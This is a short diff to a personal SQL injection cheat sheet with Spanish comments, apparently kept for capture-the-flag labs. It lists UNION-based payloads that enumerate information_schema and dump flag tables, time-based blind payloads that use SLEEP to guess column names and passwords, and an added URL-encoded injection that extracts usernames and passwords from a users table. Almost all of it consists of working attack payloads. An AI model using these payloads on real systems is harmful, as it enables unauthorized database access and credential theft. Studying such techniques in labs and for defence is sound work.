@@ -38,7 +38,7 @@ union select 1,2,column_name,4 from information_schema.columns where table_schem
 # campos 
 union select 1,2,id,4 from sqhell_5.flag; # muestra el contenido de la tabla 
 union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag; # muestra campos especificos
-
+/admin?user=0+union+select+1,concat(username,password),3,4+from+marketplace.users+limit+1,1
 # sqli tipo time based
 UNION SELECT SLEEP(2),2 FROM information_schema.columns WHERE table_schema ='sqli_four' and table_name = 'users' and column_name like '%';--
 UNION SELECT SLEEP(2),2 from users where username='admin' and password like '%';--
